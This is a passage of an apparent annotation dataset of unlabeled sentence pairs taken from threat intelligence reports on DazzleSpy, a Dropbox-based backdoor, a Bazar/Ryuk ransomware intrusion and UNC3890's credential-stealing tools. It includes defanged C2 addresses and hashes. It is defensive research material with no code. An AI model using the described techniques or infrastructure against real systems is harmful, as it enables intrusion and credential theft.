    },
    {
        "id": "cti_reports_filtered/r-1100.md::S44<=>S48",
        "S1": "DazzleSpy is a full-featured backdoor that provides attackers a large set of functionalities to control, and exfiltrate files from, a compromised computer.",
        "S2": "DazzleSpy connects to a hardcoded C&C server; the IP address and port found in the sample we decrypted was 88.218.192[.]128:5633.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md::S45<=>S48",
        "S1": "Our sample is a Mach-O binary file compiled for x86_64 CPU architecture.",
        "S2": "DazzleSpy connects to a hardcoded C&C server; the IP address and port found in the sample we decrypted was 88.218.192[.]128:5633.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md::S46<=>S49",
        "S1": "In order to persist on the compromised device, the malware adds a Property List file (plist; see Figure 8) named com.apple.softwareupdate.plist to the LaunchAgents folder.",
        "S2": "At first, the malware performs a TLS handshake, then uses a custom protocol to exchange JSON objects to deliver commands from the C&C server to compromised Macs.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md::S48<=>S50",
        "S1": "DazzleSpy connects to a hardcoded C&C server; the IP address and port found in the sample we decrypted was 88.218.192[.]128:5633.",
        "S2": "DazzleSpy\u2019s binary contains an X.509 certificate used as a certificate authority (CA).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md::S49<=>S53",
        "S1": "At first, the malware performs a TLS handshake, then uses a custom protocol to exchange JSON objects to deliver commands from the C&C server to compromised Macs.",
        "S2": "The technique protects the malware\u2019s communications from potential eavesdropping by refusing to send data if end-to-end encryption is not possible.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md::S49<=>S51",
        "S1": "At first, the malware performs a TLS handshake, then uses a custom protocol to exchange JSON objects to deliver commands from the C&C server to compromised Macs.",
        "S2": "It verifies that the server\u2019s certificate is issued by that authority.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md::S0<=>S25",
        "S1": "Our investigation started with the emails sent from an employee of the Administrative Office of the President in Afghanistan to the employees of the Afghanistan National Security Council (NSC).",
        "S2": "In this attack, some of the actions we spotted included:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md::S2<=>S16",
        "S1": "The email contains a password-protected RAR archive named NSC Press conference.rar .",
        "S2": "It then proceeds by uploading two files to the server:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md::S3<=>S5",
        "S1": "Extracting the archive with the password provided in the email requires user interaction and therefore provides a challenge for some sandbox security solutions.",
        "S2": "The content of the lure email suggests that the attached file is the document, hence, to reduce the suspicion of the victim running the executable, the attackers use the simple trick \u2013 the first document on the victim\u2019s desktop is opened for the user upon the dropper execution.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md::S5<=>S7",
        "S1": "The content of the lure email suggests that the attached file is the document, hence, to reduce the suspicion of the victim running the executable, the attackers use the simple trick \u2013 the first document on the victim\u2019s desktop is opened for the user upon the dropper execution.",
        "S2": "The backdoor contain narrow capabilities: download and upload files, run commands and send the attackers the results.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md::S7<=>S9",
        "S1": "The backdoor contain narrow capabilities: download and upload files, run commands and send the attackers the results.",
        "S2": "To hide malicious functionality \u2013 persistence and C&C communication \u2013 from static detections, the malware uses a common obfuscation technique known as \u201cstackstrings\u201d to build wide char strings.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md::S8<=>S19",
        "S1": "However short the list, they allow the attackers to upload and execute additional tools for further reconnaissance and lateral movement.",
        "S2": "When the attackers need to send a file or command to the victim machine, they place them to the folder named d in the victim\u2019s Dropbox folder.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md::S10<=>S24",
        "S1": "The backdoor utilizes Dropbox as a C&C server, by sending and receiving commands written to a specific folder in a specially created Dropbox account, prepared by the attacker before the operation.",
        "S2": "Once the C&C communication is established, the threat actor starts by executing fingerprinting and reconnaissance commands on the machine.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md::S10<=>S25",
        "S1": "The backdoor utilizes Dropbox as a C&C server, by sending and receiving commands written to a specific folder in a specially created Dropbox account, prepared by the attacker before the operation.",
        "S2": "In this attack, some of the actions we spotted included:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md::S10<=>S12",
        "S1": "The backdoor utilizes Dropbox as a C&C server, by sending and receiving commands written to a specific folder in a specially created Dropbox account, prepared by the attacker before the operation.",
        "S2": "The backdoor uses the Dropbox API with a hardcoded bearer access token and has the ability to download, upload, and execute files.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md::S11<=>S13",
        "S1": "By using the legitimate Dropbox service for C&C communications, instead of regular dedicated server infrastructure, aids in masking the malicious traffic in the target\u2019s network, as no communication to abnormal websites is taking place.",
        "S2": "In the initialization stage, the backdoor creates a unique folder for the victim in an attacker-controlled Dropbox account.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md::S13<=>S15",
        "S1": "In the initialization stage, the backdoor creates a unique folder for the victim in an attacker-controlled Dropbox account.",
        "S2": "Locally, the backdoor creates a working folder at C:\\users\\public\\<d> (where <d> is a random integer).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md::S13<=>S21",
        "S1": "In the initialization stage, the backdoor creates a unique folder for the victim in an attacker-controlled Dropbox account.",
        "S2": "Finally, if the file named c.txt \u2013 that contains the attacker command, exists in this working folder, the backdoor executes it using the ComSpec environment variable, which normally points to the command line interpreter (like cmd.exe ), and uploads the results back to the Dropbox drive while deleting the command from the server.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md::S14<=>S19",
        "S1": "The folder is named by the victim\u2019s MAC address which is obtained using GetAdaptersInfo API.",
        "S2": "When the attackers need to send a file or command to the victim machine, they place them to the folder named d in the victim\u2019s Dropbox folder.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md::S15<=>S19",
        "S1": "Locally, the backdoor creates a working folder at C:\\users\\public\\<d> (where <d> is a random integer).",
        "S2": "When the attackers need to send a file or command to the victim machine, they place them to the folder named d in the victim\u2019s Dropbox folder.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md::S16<=>S20",
        "S1": "It then proceeds by uploading two files to the server:",
        "S2": "The malware retrieves this folder and downloads all its contents to the working folder.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md::S16<=>S21",
        "S1": "It then proceeds by uploading two files to the server:",
        "S2": "Finally, if the file named c.txt \u2013 that contains the attacker command, exists in this working folder, the backdoor executes it using the ComSpec environment variable, which normally points to the command line interpreter (like cmd.exe ), and uploads the results back to the Dropbox drive while deleting the command from the server.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md::S19<=>S28",
        "S1": "When the attackers need to send a file or command to the victim machine, they place them to the folder named d in the victim\u2019s Dropbox folder.",
        "S2": "- Access to the victim\u2019s files, especially documents located on the Desktop",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md::S0<=>S2",
        "S1": "Like in our prior two reports of Ryuk campaigns, the initial access came from phishing emails containing links to google drive that when clicked, downloaded a Bazar Loader backdoor executable.",
        "S2": "In this case, the time from initial Bazar execution to domain recon was 5 minutes, and deployment of Cobalt Strike beacons was within 10 minutes.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md::S1<=>S3",
        "S1": "In our prior cases we generally saw a lag time, ranging hours to days, from the initial click to Ryuk.",
        "S2": "This is by far the quickest we have seen them act.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md::S1<=>S12",
        "S1": "In our prior cases we generally saw a lag time, ranging hours to days, from the initial click to Ryuk.",
        "S2": "At the 2 hour mark the threat actors made the move to deploy Ryuk ransomware by establishing RDP connections from the domain controllers to servers.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md::S2<=>S8",
        "S1": "In this case, the time from initial Bazar execution to domain recon was 5 minutes, and deployment of Cobalt Strike beacons was within 10 minutes.",
        "S2": "With domain administrator privileges obtained, the threat actors then moved laterally throughout the network using SMB and RDP to deploy Cobalt Strike beacons on the domain controllers around 1 hour after the initial execution of Bazar.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md::S2<=>S4",
        "S1": "In this case, the time from initial Bazar execution to domain recon was 5 minutes, and deployment of Cobalt Strike beacons was within 10 minutes.",
        "S2": "After bringing in Cobalt Strike, we saw familiar TTP\u2019s with using AdFind to continue domain discovery activity.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md::S3<=>S5",
        "S1": "This is by far the quickest we have seen them act.",
        "S2": "In this case, we saw them deploy persistence on the beachhead host, an action we had not previously seen in our other cases.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md::S4<=>S6",
        "S1": "After bringing in Cobalt Strike, we saw familiar TTP\u2019s with using AdFind to continue domain discovery activity.",
        "S2": "After establishing another C2 for an additional Cobalt Strike beacon, they employed the Zerologon exploit (CVE 2020-1472) and obtained domain admin level privileges.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md::S5<=>S7",
        "S1": "In this case, we saw them deploy persistence on the beachhead host, an action we had not previously seen in our other cases.",
        "S2": "We also saw host process injection on the beachhead used for obfuscation and privilege escalation.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md::S6<=>S8",
        "S1": "After establishing another C2 for an additional Cobalt Strike beacon, they employed the Zerologon exploit (CVE 2020-1472) and obtained domain admin level privileges.",
        "S2": "With domain administrator privileges obtained, the threat actors then moved laterally throughout the network using SMB and RDP to deploy Cobalt Strike beacons on the domain controllers around 1 hour after the initial execution of Bazar.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md::S8<=>S11",
        "S1": "With domain administrator privileges obtained, the threat actors then moved laterally throughout the network using SMB and RDP to deploy Cobalt Strike beacons on the domain controllers around 1 hour after the initial execution of Bazar.",
        "S2": "After establishing Cobalt Strike beacons on those they felt ready to proceed to their final objectives.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md::S8<=>S38",
        "S1": "With domain administrator privileges obtained, the threat actors then moved laterally throughout the network using SMB and RDP to deploy Cobalt Strike beacons on the domain controllers around 1 hour after the initial execution of Bazar.",
        "S2": "While encryption was started 2 hours into the attack, by the 3 hour mark the actors had completed ransom of the entire environment.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md::S8<=>S10",
        "S1": "With domain administrator privileges obtained, the threat actors then moved laterally throughout the network using SMB and RDP to deploy Cobalt Strike beacons on the domain controllers around 1 hour after the initial execution of Bazar.",
        "S2": "From there, they targeted other severs in the environment; specifically, back up systems, file servers, and software deployment servers.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md::S8<=>S13",
        "S1": "With domain administrator privileges obtained, the threat actors then moved laterally throughout the network using SMB and RDP to deploy Cobalt Strike beacons on the domain controllers around 1 hour after the initial execution of Bazar.",
        "S2": "This continued for the next hour until the entire domain had been encrypted, with that work completing just 3 hours after the first Bazar Loader was executed.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md::S9<=>S12",
        "S1": "On the domain controllers, some additional discovery was done using the PowerShell Active Directory module.",
        "S2": "At the 2 hour mark the threat actors made the move to deploy Ryuk ransomware by establishing RDP connections from the domain controllers to servers.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md::S11<=>S24",
        "S1": "After establishing Cobalt Strike beacons on those they felt ready to proceed to their final objectives.",
        "S2": "The Cobalt Strike beacons used in the environment used similar code signing certificates.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md::S15<=>S25",
        "S1": "Execution of the initial Bazar Loader malware relies on user interaction.",
        "S2": "In previous cases, we generally saw some lag time between infection and further actions but this time things moved much quicker, starting with initial discovery executed by Bazar less than 5 minutes after initial execution.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md::S15<=>S22",
        "S1": "Execution of the initial Bazar Loader malware relies on user interaction.",
        "S2": "The Bazar Loader malware was using a code signing certificate signed by Digicert under the organization NOSOV SP Z O O",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md::S17<=>S21",
        "S1": "This time, unlike prior investigations, clear persistence was found setup on the beachhead host.",
        "S2": "Process injection was used on the beachhead host to to inject into svchost.exe",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md::S20<=>S33",
        "S1": "Rubeus was used to kerberoast the environment.",
        "S2": "Discovery data (AdFind and Rubeus outputs ) was exfiltrated out of the network via FTP.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md::S21<=>S31",
        "S1": "Process injection was used on the beachhead host to to inject into svchost.exe",
        "S2": "RDP connections were initiated from Cobalt Strike Beacons running on the beachhead host to two domain controllers and then Cobalt Strike executables were dropped by these connections.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md::S24<=>S27",
        "S1": "The Cobalt Strike beacons used in the environment used similar code signing certificates.",
        "S2": "Seven minutes later, after launching a Cobalt Strike beacon, AdFind was used\u2013 running the same discovery pattern seen in previous reporting.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md::S24<=>S31",
        "S1": "The Cobalt Strike beacons used in the environment used similar code signing certificates.",
        "S2": "RDP connections were initiated from Cobalt Strike Beacons running on the beachhead host to two domain controllers and then Cobalt Strike executables were dropped by these connections.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md::S27<=>S31",
        "S1": "Seven minutes later, after launching a Cobalt Strike beacon, AdFind was used\u2013 running the same discovery pattern seen in previous reporting.",
        "S2": "RDP connections were initiated from Cobalt Strike Beacons running on the beachhead host to two domain controllers and then Cobalt Strike executables were dropped by these connections.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md::S27<=>S33",
        "S1": "Seven minutes later, after launching a Cobalt Strike beacon, AdFind was used\u2013 running the same discovery pattern seen in previous reporting.",
        "S2": "Discovery data (AdFind and Rubeus outputs ) was exfiltrated out of the network via FTP.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md::S29<=>S34",
        "S1": "It appears that the threat actors are now piping these commands into a batch file one at a time instead of dropping adf.bat to disk.",
        "S2": "At roughly the 2 hour mark, we saw the threat actors begin to act on their final objectives.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md::S34<=>S38",
        "S1": "At roughly the 2 hour mark, we saw the threat actors begin to act on their final objectives.",
        "S2": "While encryption was started 2 hours into the attack, by the 3 hour mark the actors had completed ransom of the entire environment.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S2<=>S5",
        "S1": "Watering holes \u2013 Mandiant identified a potential watering hole hosted on a login page of a legitimate Israeli shipping company, which was likely compromised by UNC3890.",
        "S2": "When we inspected the watering hole, it was already inactive, but it was most likely used to target clients and users of that Israeli shipping company, in particular, one\u2019s shipping or handling heat-sensitive cargo (based on the nature of the compromised website).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S2<=>S6",
        "S1": "Watering holes \u2013 Mandiant identified a potential watering hole hosted on a login page of a legitimate Israeli shipping company, which was likely compromised by UNC3890.",
        "S2": "We have an additional indication of an attempted targeting of another major Israeli shipping company by UNC3890, which is consistent with the watering hole.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S3<=>S5",
        "S1": "The watering hole was active at least until November 2021, and upon entering the legitimate login page, the user would be sending a POST request with preliminary data about the logged user to an attacker controlled non-ASCII Punycode domain (lir\u0131kedin[.]com, interpreted as xn--lirkedin-vkb[.]com).",
        "S2": "When we inspected the watering hole, it was already inactive, but it was most likely used to target clients and users of that Israeli shipping company, in particular, one\u2019s shipping or handling heat-sensitive cargo (based on the nature of the compromised website).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S7<=>S9",
        "S1": "Credentials harvesting by masquerading as legitimate services \u2013 we uncovered several domains resolving to UNC3890\u2019s C2 servers.",
        "S2": "UNC3890 may have used these domains to harvest credentials to legitimate services, to send phishing lures, or to overall mask their activity and blend in with expected network traffic.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S7<=>S11",
        "S1": "Credentials harvesting by masquerading as legitimate services \u2013 we uncovered several domains resolving to UNC3890\u2019s C2 servers.",
        "S2": "In addition, we identified an UNC3890 server that hosted several ZIP files containing scraped contents of Facebook and Instagram accounts of legitimate individuals.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S8<=>S21",
        "S1": "Some of the domains were masquerading as legitimate services and entities, as can be observed in the table below.",
        "S2": "Most of the tools were available for download directly from UNC3890 controlled infrastructure, indicating they may have been served as 1st stage implants.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S10<=>S28",
        "S1": "It should be noted that many of these domains were hosted on the same infrastructure used by UNC3890, but date back to late 2020, which is before we can corroborate UNC3890 has been active.",
        "S2": "The name of the log files is the current date of the infected machine.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S11<=>S13",
        "S1": "In addition, we identified an UNC3890 server that hosted several ZIP files containing scraped contents of Facebook and Instagram accounts of legitimate individuals.",
        "S2": "Fake job offers, potentially as part of a phishing or watering hole campaign \u2013 we observed UNC3890 utilize a .xls lure file designed as a fake job offer (MD5: 639f83fa4265ddbb43e85b763fe3dbac) which installs SUGARDUMP, a credential harvesting tool.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S13<=>S16",
        "S1": "Fake job offers, potentially as part of a phishing or watering hole campaign \u2013 we observed UNC3890 utilize a .xls lure file designed as a fake job offer (MD5: 639f83fa4265ddbb43e85b763fe3dbac) which installs SUGARDUMP, a credential harvesting tool.",
        "S2": "In addition, we observed UNC3890 usage of domains with similar themes such as naturaldolls[.]store (hosting a fake Outlook login page) and xxx-doll[.]com.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S13<=>S15",
        "S1": "Fake job offers, potentially as part of a phishing or watering hole campaign \u2013 we observed UNC3890 utilize a .xls lure file designed as a fake job offer (MD5: 639f83fa4265ddbb43e85b763fe3dbac) which installs SUGARDUMP, a credential harvesting tool.",
        "S2": "Fake commercials for AI-based robotic dolls \u2013 one of UNC3890\u2019s most recent endeavor to target victims includes the usage of a video commercial for AI-based robotic dolls, used as a lure to deliver SUGARDUMP.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S15<=>S19",
        "S1": "Fake commercials for AI-based robotic dolls \u2013 one of UNC3890\u2019s most recent endeavor to target victims includes the usage of a video commercial for AI-based robotic dolls, used as a lure to deliver SUGARDUMP.",
        "S2": "In this sector we will focus on the analysis of two of UNC3890\u2019s proprietary tools we identified in our investigation: the SUGARUSH backdoor, and the SUGARDUMP credential harvesting tool.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S16<=>S19",
        "S1": "In addition, we observed UNC3890 usage of domains with similar themes such as naturaldolls[.]store (hosting a fake Outlook login page) and xxx-doll[.]com.",
        "S2": "In this sector we will focus on the analysis of two of UNC3890\u2019s proprietary tools we identified in our investigation: the SUGARUSH backdoor, and the SUGARDUMP credential harvesting tool.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S19<=>S21",
        "S1": "In this sector we will focus on the analysis of two of UNC3890\u2019s proprietary tools we identified in our investigation: the SUGARUSH backdoor, and the SUGARDUMP credential harvesting tool.",
        "S2": "Most of the tools were available for download directly from UNC3890 controlled infrastructure, indicating they may have been served as 1st stage implants.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S20<=>S38",
        "S1": "We will also provide a brief analysis of the public tools utilized by UNC3890.",
        "S2": "We observed several versions of SUGARDUMP:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S25<=>S29",
        "S1": "Subsequently, SUGARUSH creates a logging folder called \u201cLogs\u201d, and stores it under its current execution path.",
        "S2": "SUGARUSH will then check for internet connectivity of the host and will create a log file indicating the result with message \u201cYou are online at <current_date>\u201d or \u201cYou are offline at <current_date>\u201d.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S25<=>S27",
        "S1": "Subsequently, SUGARUSH creates a logging folder called \u201cLogs\u201d, and stores it under its current execution path.",
        "S2": "\u201cServiceLog\u201d is created in the \u201cLogs\u201d folder, and a new log file is written with the message \u201cService is started at <current_date>\u201d.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S31<=>S48",
        "S1": "SUGARUSH then waits to receive an answer from the C2 which will be interpreted as a CMD command for execution.",
        "S2": "We observed two PDB paths contained in SUGARDUMP samples:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S36<=>S38",
        "S1": "Afterwards, SUGARDUMP will extract all of the available usernames and passwords from these folders.",
        "S2": "We observed several versions of SUGARDUMP:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S38<=>S46",
        "S1": "We observed several versions of SUGARDUMP:",
        "S2": "SUGARDUMP first known version \u2013 dated to early 2021, we observed two variants of this version: the first one saves the stolen credentials under in a .txt file under the path: \u201cC:\\\\Users\\\\User\\\\Desktop\\\\test2.txt\u201d.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S39<=>S46",
        "S1": "- SUGARDUMP first known version, dated to early 2021.",
        "S2": "SUGARDUMP first known version \u2013 dated to early 2021, we observed two variants of this version: the first one saves the stolen credentials under in a .txt file under the path: \u201cC:\\\\Users\\\\User\\\\Desktop\\\\test2.txt\u201d.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S41<=>S79",
        "S1": "It is possible it was an unfinished version, or that UNC3890 used other tools and/or manually connect to the victim to exfiltrate the stolen credentials.",
        "S2": "The malware will then send the file \u201cCrashLog.txt\u201d via email, by connecting and sending it from one of the two following email addresses:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S41<=>S78",
        "S1": "It is possible it was an unfinished version, or that UNC3890 used other tools and/or manually connect to the victim to exfiltrate the stolen credentials.",
        "S2": "The collected data is subsequently encoded using base64 and stored under: %<malware_execution_folder>%\\\\CrashLog.txt",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S43<=>S46",
        "S1": "This version utilizes Yahoo, Yandex and Gmail addresses for exfiltration, and uses a commercial AI-driven robotic dolls as a lure.",
        "S2": "SUGARDUMP first known version \u2013 dated to early 2021, we observed two variants of this version: the first one saves the stolen credentials under in a .txt file under the path: \u201cC:\\\\Users\\\\User\\\\Desktop\\\\test2.txt\u201d.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S46<=>S48",
        "S1": "SUGARDUMP first known version \u2013 dated to early 2021, we observed two variants of this version: the first one saves the stolen credentials under in a .txt file under the path: \u201cC:\\\\Users\\\\User\\\\Desktop\\\\test2.txt\u201d.",
        "S2": "We observed two PDB paths contained in SUGARDUMP samples:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S46<=>S70",
        "S1": "SUGARDUMP first known version \u2013 dated to early 2021, we observed two variants of this version: the first one saves the stolen credentials under in a .txt file under the path: \u201cC:\\\\Users\\\\User\\\\Desktop\\\\test2.txt\u201d.",
        "S2": "This version of SUGARDUMP harvest credentials from the following browsers:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S46<=>S85",
        "S1": "SUGARDUMP first known version \u2013 dated to early 2021, we observed two variants of this version: the first one saves the stolen credentials under in a .txt file under the path: \u201cC:\\\\Users\\\\User\\\\Desktop\\\\test2.txt\u201d.",
        "S2": "SUGARDUMP using HTTP for C2 communication \u2013 dated to April 2022, this version sends the stolen credentials to an UNC3890 C2 server (144.202.123[.]248:80).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S48<=>S68",
        "S1": "We observed two PDB paths contained in SUGARDUMP samples:",
        "S2": "The malware then attempts to connect to \u201csmtp.yandex.com\u201d and \u201csmtp.mail.yahoo.com\u201d via port 587.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S50<=>S53",
        "S1": "Since this is a rather generic PDB path, this similarity may be circumstantial, and we consider it a weak link.",
        "S2": "This variant was downloaded from a known UNC3890 C2 (URL: hxxp://128.199.6[.]246/3-Video-VLC.exe), and is a slightly more advanced version with similar credential harvesting functionality.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S50<=>S86",
        "S1": "Since this is a rather generic PDB path, this similarity may be circumstantial, and we consider it a weak link.",
        "S2": "We observed this version dropped by a .xls file which contains a fake job offer to a software developer position in NexisLexis, a data analytics platform (MD5: 639f83fa4265ddbb43e85b763fe3dbac).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S54<=>S63",
        "S1": "The downloaded file \u201c3-Video-VLC.exe\u201d (MD5: ae0a16b6feddd53d1d52ff50d85a42d5) is a Windows installer which, upon execution, drops and executes two files under the path %AppData%\\\\Roaming\\\\:",
        "S2": "- In Windows 7 the scheduled task is called: \"MicrosoftInternetExplorerCrashRepoeterTaskMachineUA\", and contains the description \"Keep your Microsoft software without any bugs.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S56<=>S58",
        "S1": "- RealDo1080.mp4 (MD5: d8fb3b6f5681cf5eec2b89be9b632b05) \u2013 a social engineering video, played using Windows Media Player while CrashReporter.exe is executed.",
        "S2": "Upon first execution, CrashReporter.exe (SUGARDUMP) attempts to locate the folder: %AppData%\\\\Microsoft\\\\Edge\\\\User Data\\\\CrashPad\\\\",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S57<=>S64",
        "S1": "The video contains a commercial for AI-driven robotic dolls.",
        "S2": "If this task is disabled or stopped, your Microsoft software may not work properly, meaning bugs that may arise cannot be fixed and features may not work.\u201d",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S69<=>S75",
        "S1": "If the attempt is successful, the malware starts to harvest bowser related information on the host.",
        "S2": "For each browser the malware attempts to extract login credentials from the following paths:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S70<=>S76",
        "S1": "This version of SUGARDUMP harvest credentials from the following browsers:",
        "S2": "This version of SUGARDUMP also extracts the browser\u2019s version, browsing history, bookmarks, and cookies.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S75<=>S79",
        "S1": "For each browser the malware attempts to extract login credentials from the following paths:",
        "S2": "The malware will then send the file \u201cCrashLog.txt\u201d via email, by connecting and sending it from one of the two following email addresses:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S76<=>S85",
        "S1": "This version of SUGARDUMP also extracts the browser\u2019s version, browsing history, bookmarks, and cookies.",
        "S2": "SUGARDUMP using HTTP for C2 communication \u2013 dated to April 2022, this version sends the stolen credentials to an UNC3890 C2 server (144.202.123[.]248:80).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S79<=>S82",
        "S1": "The malware will then send the file \u201cCrashLog.txt\u201d via email, by connecting and sending it from one of the two following email addresses:",
        "S2": "If SUGARDUMP fails to send the message, it creates a new file under: %<malware_current_execution_path>%\\\\CrashLogName.txt, and writes to the file the error details.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S82<=>S84",
        "S1": "If SUGARDUMP fails to send the message, it creates a new file under: %<malware_current_execution_path>%\\\\CrashLogName.txt, and writes to the file the error details.",
        "S2": "Afterwards, the malware terminates its execution.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S84<=>S88",
        "S1": "Afterwards, the malware terminates its execution.",
        "S2": "The PE file is the newest version of SUGARDUMP we observed so far.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S85<=>S94",
        "S1": "SUGARDUMP using HTTP for C2 communication \u2013 dated to April 2022, this version sends the stolen credentials to an UNC3890 C2 server (144.202.123[.]248:80).",
        "S2": "After the encryption process, the data is also encoded using Base64, and subsequently sent over HTTP to an UNC3890 C2 server: 144.202.123[.]248:80.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S85<=>S89",
        "S1": "SUGARDUMP using HTTP for C2 communication \u2013 dated to April 2022, this version sends the stolen credentials to an UNC3890 C2 server (144.202.123[.]248:80).",
        "S2": "Like previous versions, this version of SUGARDUMP harvests credentials from Chromium-based browsers Chrome, Opera and Edge.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S86<=>S89",
        "S1": "We observed this version dropped by a .xls file which contains a fake job offer to a software developer position in NexisLexis, a data analytics platform (MD5: 639f83fa4265ddbb43e85b763fe3dbac).",
        "S2": "Like previous versions, this version of SUGARDUMP harvests credentials from Chromium-based browsers Chrome, Opera and Edge.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S86<=>S88",
        "S1": "We observed this version dropped by a .xls file which contains a fake job offer to a software developer position in NexisLexis, a data analytics platform (MD5: 639f83fa4265ddbb43e85b763fe3dbac).",
        "S2": "The PE file is the newest version of SUGARDUMP we observed so far.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S88<=>S95",
        "S1": "The PE file is the newest version of SUGARDUMP we observed so far.",
        "S2": "The .NET project for this version of SUGARDUMP was named \"yaal\", which is the Farsi word for a horse\u2019s mane.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S89<=>S95",
